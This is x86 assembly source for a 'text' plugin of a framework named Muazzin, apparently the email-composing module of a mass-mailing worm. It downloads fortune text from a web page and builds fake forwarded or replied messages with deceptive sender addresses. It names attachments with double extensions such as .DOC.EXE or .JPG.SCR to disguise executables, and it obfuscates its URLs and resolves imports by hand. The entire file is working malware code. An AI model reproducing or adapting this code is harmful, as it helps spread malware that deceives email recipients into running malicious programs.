;Muazzin para gerar texto de email, consultando um server SOAP na www

;*URLs must be XORed after compile with 0xff

BITS 32

%include "\muazzin\muazzin.asi"

TYPE    EQU "text"
VERSION EQU 0302h

;%define DEBUG 1

entry:
       mov esi, [esp+4]
       mov eax, [esi+m_why]
       test eax, MT_GENTEXT
       jnz near gen_da_text
       test eax, MT_QUERY
       jz near gen_da_text.exit
       mov esi, MT_QUERY+MT_GENTEXT
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

gen_da_text:
       pushad
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       mov eax, [esi+m_buffer]
       mov [ebp+emailbody], eax

       push dword urls_size
       pop ecx
       lea esi,[ebp+urls.url1]
  .notloop:
       not byte [esi]
       lodsb
       loop .notloop

       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax
       mov ecx, [esp]
       mov [ecx-4], eax
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       jmp .next_import
  .dll_done:
       pop esi
       jmp .next_dll
  .all_import:

       push dword 64*1024
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+memory], eax
       call [ebp+GetTickCount]
       mov [ebp+seed], eax

%ifdef DEBUG
       push byte 0
       call .tmptmp16
       db "fortune",0
  .tmptmp16:
       call .tmptmp116
       db "checking inet...",0
  .tmptmp116:
       push byte 0
       call [ebp+MessageBoxA]
%endif

  .retryconnect:
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       call [ebp+InternetGetConnectedState]
       dec eax
       pop eax
       jz .retry
       push dword 60*1000
       call [ebp+Sleep]
       jmp .retryconnect

%ifdef DEBUG
       push byte 0
       call .tmptmp1
       db "fortune",0
  .tmptmp1:
       call .tmptmp11
       db "connected to inet!",0
  .tmptmp11:
       push byte 0
       call [ebp+MessageBoxA]
%endif

  .retry:
       sub ebx, ebx
       push ebx
       push ebx
       push ebx
       push ebx
       push ebx
       call [ebp+InternetOpenA]
       test eax, eax
  .not_connected22:
       jz near .not_connected
       mov edi, eax
       push ebx
       push ebx
       push ebx
       push ebx

       push byte 2
       call rnd
       mov eax, [ebp+urls+eax*4]
       add eax, ebp
       push eax

       push edi
       call [ebp+InternetOpenUrlA]
       test eax, eax
       jz near .not_connected1
       push ebx
       push esp
       mov ebx, eax
       push dword 64*1024
       push dword [ebp+memory]
       push ebx
       call [ebp+InternetReadFile]
       xchg ebx,[esp]
       call [ebp+InternetCloseHandle]
       push edi
       call [ebp+InternetCloseHandle]

       cmp ebx, 2*1024
       jb .retry

%ifdef DEBUG
       push byte 0
       call .tmptmp
       db "fortune",0
  .tmptmp:
       push dword [ebp+memory]
       push byte 0
       call [ebp+MessageBoxA]
%endif

       mov esi, [ebp+memory]
       mov ecx, ebx
  .search_tag:
       lodsb
       cmp al, "<"
       jne .loop_tag
       mov eax, [esi]
       or eax, 00202020h
       cmp eax, "pre>"
       jne .loop_tag
       lea edi, [esi+6]
  .search_endtag:
       lodsb
       cmp al, "<"
       jne .loop_tag2
       mov eax, [esi]
       or eax, 20202000h
       cmp eax, "/pre"
       jne .loop_tag2
       mov dword [esi-1],0
       mov ebx, esi
       sub ebx, edi
       xchg esi, edi
       jmp .zopy

  .loop_tag2:
       loop .search_endtag
       jmp .not_connected
  .loop_tag:
       loop .search_tag
       jmp .not_connected

  .zopy:
%ifdef DEBUG
       push byte 0
       call .tmptmp666
       db "fortune",0
  .tmptmp666:
       push esi
       push byte 0
       call [ebp+MessageBoxA]
%endif
       cmp ebx, 128
       jb near .retry

       push byte 2
       call rnd
       mov edx, eax             ;edx=1 is _forward_

       mov edi, [ebp+emailbody]
       pushad
;       add edi, mtext_bodymsg
       mov ecx, ebx
  .fwd:
       lodsb
       stosb
       cmp al, 0ah
       jne .no_fwd
       dec edi
       mov ax, 0a0dh
       stosw
       cmp dl, 1
       jne .no_fwd
       mov ax, "> "
       stosw
  .no_fwd:
       loop .fwd

       mov eax, 0a0dh
       stosd

       mov esi,[esp+4]
       mov edi,[esp]
       add edi, mtext_exename

       shr ebx,3
       push ebx
       call rnd
       mov ebx, eax

  .start_word:
       mov al, [esi]
       or al, 20h
       cmp al, "a"
       jb .no_word
       cmp al, "z"
       ja .no_word
       test ebx, ebx
       jz .check_word
       dec ebx
  .skip_ch:
       lodsb
       cmp al, " "
       jne .skip_ch
       jmp .start_word
  .no_word:
       inc esi
       jmp .start_word
  .check_word:
       push esi
 .cnt_ch:
       lodsb
       cmp al, " "
       je .count
       inc ebx
       jmp .cnt_ch
  .count:
       pop esi
       cmp ebx,6
       mov ebx,0
       jb .skip_ch
       sub edx, edx
  .cpy:
       lodsb
       test al, al
       je .extension
       cmp al, " "
       je .extension
       cmp al, "."
       je .extension
       cmp al, ","
       je .extension
       cmp al, 0ah
       je .extension
       stosb
       jmp .cpy
  .extension:
       push byte 5
       call rnd
  .keepdoing:
       mov ebx, ".EXE"
       dec al
       jz .saveit
       mov ebx, ".PIF"
       dec al
       jz .saveit
       mov ebx, ".SCR"
       dec al
       jz .saveit

       test edx, edx
       jnz .keepdoing
       inc edx

       push byte 5
       call rnd
       mov ebx, ".DOC"
       dec al
       jz .saveit2
       mov ebx, ".TXT"
       dec al
       jz .saveit2
       mov ebx, ".AVI"
       dec al
       jz .saveit2
       mov ebx, ".GIF"
       dec al
       jz .saveit2
       mov ebx, ".JPG"
  .saveit2:
       mov eax, ebx
       stosd
       jmp .extension

  .saveit:
       mov eax, ebx
       stosd
       sub eax, eax
       stosd
       popad
       add edi, mtext_headers

       mov eax, "From"
       stosd
       mov eax, ": "
       stosw

       push esi
       push byte 8
       call rnd
       mov esi,[ebp+eax*4+froms]
       add esi, ebp
  .zopyzopy:
       lodsb
       test al, al
       jz .zopyzopy666
       stosb
       jmp .zopyzopy
  .zopyzopy666:
       pop esi

       mov ax, 0a0dh
       stosw

       mov eax, "Subj"
       stosd
       mov eax, "ect:"
       stosd
       mov al, " "
       stosb

       cmp dl, 1
       jne .no_fwd2
       push byte 6
       call rnd
       mov ebx, "enc:"
       dec al
       jz .stoit
       mov ebx, "re: "
       dec al
       jz .stoit
       mov ebx, "fwd:"
  .stoit:
       mov eax, ebx
       stosd
  .no_fwd2:

       sub ebx, ebx
       push byte 5
       call rnd
       xchg ecx, eax
  .skip_word:
       jecxz .start_cpy
       inc ebx
  .seek_space:
       lodsb
       cmp al, " "
       je .end_word
       cmp al, "."
       je .end_word
       cmp al, ","
       je .end_word
       cmp al, ":"
       jne .seek_space
  .end_word:
       dec ecx
       jmp .skip_word

  .start_cpy:
       test ebx,ebx
       jz .skip_dots
       mov eax,"...."
       stosd
       dec edi
  .skip_dots:

       push byte 5
       call rnd
       lea ecx, [eax+3]
  .nextword:
       lodsb
       stosb
       cmp al, 0ah
       jne .nochange
  .change:
       dec edi
  .nochange:

       cmp al, " "
       je .word_copied
       cmp al, 0ah
       je .word_copied
       cmp al, ","
       je .word_copied
       cmp al, ":"
       je .word_copied
       cmp al, "."
       jne .nextword
       jmp .done666

  .word_copied:
       loop .nextword
  .done666:
       mov eax, 0a0dh
       stosd
       jmp .not_connected

  .not_connected1:
       push edi
       call [ebp+InternetCloseHandle]
  .not_connected:

       push dword [ebp+memory]
       call [ebp+GlobalFree]
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp .next_unload
  .all_unload:
       popad
  .exit:
       mov dword [esi+m_result], MR_OK
       ret 4

rnd:
       push ecx
       push edx
       mov eax, 12345678h
  seed equ $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       mov [ebp+seed], eax
       mov ecx, [esp+(2*4)+4]
       sub edx, edx
       div ecx
       xchg eax, edx
       pop edx
       pop ecx
       ret 4

froms:
       dd .from1
       dd .from2
       dd .from3
       dd .from4
       dd .from5
       dd .from6
       dd .from7
       dd .from8

.from1 db '<stop@stupidity.net>',0
.from2 db '<onlyfools@rushin.ru>',0
.from3 db '<joke@jokeoftheday.com>',0
.from4 db "don't get cheated <info@gullible.ur>",0
.from5 db '<easysexfotloosers@cool.com>',0
.from6 db '<Did@YouKnow.it>',0
.from7 db '<flash4free@flash.com>',0
.from8 db '<just@Ask.it>',0

urls:
       dd .url1
       dd .url2
.url1  db "http://www.lemurlabs.com/projects/soap/fortune/soap_fortune.jsp",0
.url2  db "http://www.lemurlabs.com/projects/soap/fortune/soap_fortune.jsp",0
urls_size equ $-urls.url1

import_table dd kernel32
             dd wininet
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "GlobalAlloc", 0
.apiname004 db "GlobalFree", 0
.apiname005 db "GetTickCount",0
.apiname006 db "Sleep",0

wininet     db "WININET.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
            dd 0
.apiname001 db "InternetOpenA", 0
.apiname002 db "InternetOpenUrlA", 0
.apiname003 db "InternetCloseHandle", 0
.apiname004 db "InternetReadFile", 0
.apiname005 db "InternetGetConnectedState", 0


%ifdef DEBUG
user32      db "USER32.DLL",0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0

MessageBoxA equ user32.api001
%endif

LoadLibraryA     equ kernel32.api001
FreeLibrary      equ kernel32.api002
GlobalAlloc      equ kernel32.api003
GlobalFree       equ kernel32.api004
GetTickCount     equ kernel32.api005
Sleep            equ kernel32.api006

InternetOpenA       equ wininet.api001
InternetOpenUrlA    equ wininet.api002
InternetCloseHandle equ wininet.api003
InternetReadFile    equ wininet.api004
InternetGetConnectedState equ wininet.api005

getpaddr  dd 0
getmhnd   dd 0
memory    dd 0
emailbody dd 0
